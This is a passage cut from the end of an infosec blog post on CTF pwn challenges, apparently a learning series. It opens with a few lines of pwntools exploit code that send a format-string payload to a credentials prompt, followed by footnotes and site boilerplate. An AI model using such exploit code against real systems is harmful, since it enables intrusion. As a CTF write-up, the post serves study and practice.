<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'fmtstr_payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter credentials: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></div></div>

<h1 id="footnotes">Footnotes</h1>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Format string bug exploitation tools. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/blog/en/categories/pwn-journey/'>PWN Journey</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/blog/en/tags/reverse-engineer/"
          class="post-tag no-text-decoration" >reverse engineer</a>
      
      <a href="/blog/en/tags/pwn/"
          class="post-tag no-text-decoration" >pwn</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=PWN Journey: Part 2 - Another infosec blog&url=http://localhost:4000/blog/en/posts/pwns-2/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=PWN Journey: Part 2 - Another infosec blog&u=http://localhost:4000/blog/en/posts/pwns-2/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=PWN Journey: Part 2 - Another infosec blog&url=http://localhost:4000/blog/en/posts/pwns-2/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recent Update</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/blog/en/posts/pwns-2/">PWN Journey: Part 2</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/ez-bof/">KCSC: A simple BOF</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/HTB-Sharp/">HackTheBox: Sharp</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/HTB-Armageddon/">HackTheBox: Armageddon</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/HTB-TheNotebook/">HackTheBox: The Notebook</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
    
      
      <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/blog/en/tags/network/">network</a>
    
      
      <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
    
      
      <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
    
      
      <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
    
      
      <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
    
      
      <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
    
      
      <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a>
    
      
      <a class="post-tag" href="/blog/en/tags/web-pentest/">web-pentest</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
      
        
        <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/blog/en/posts/ez-bof/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2021-02-24 03:45:00 +0800"
    >Feb 24, 2021</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>KCSC: A simple BOF</h3>
            <div class="text-muted small">
              <p>
                





                Today we are going to test out Ghidra with one of my university pwnie challenge.


  
    
      Info
      Value
    
  
  
    
      Name
      pwn1
    
    
      SHA256
      d3e77076e7c9c113...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/blog/en/posts/pwns-1/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2021-12-08 00:00:00 +0800"
    >Dec  8, 2021</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>PWN Journey: Part 1</h3>
            <div class="text-muted small">
              <p>
                





                Foreword

Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/blog/en/posts/HTB-Sharp/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2021-05-16 03:45:00 +0800"
    >May 16, 2021</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Sharp</h3>
            <div class="text-muted small">
              <p>
                





                Hi, after a long time not posting anything on this blog because of my university workload. Let’s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) mac...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


      
        
        <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/blog/en/posts/pwns-1/" class="btn btn-outline-primary"
    prompt="Older">
    <p>PWN Journey: Part 1</p>
  </a>
  

  
  <span class="btn btn-outline-primary disabled"
    prompt="Newer">
    <p>-</p>
  </span>
  

</div>

      
        
        <!--
  The Disqus lazy loading.
-->



      
    </div>
  </div>
</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/0x7c00">The Archivist</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Most rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by Github Pages and Jekyll.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
    
      
      <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/blog/en/tags/network/">network</a>
    
      
      <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
    
      
      <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
    
      
      <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
    
      
      <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
    
      
      <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
    
      
      <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a>
    
      
      <a class="post-tag" href="/blog/en/tags/web-pentest/">web-pentest</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/blog/en/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>





<script defer src="/blog/en/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

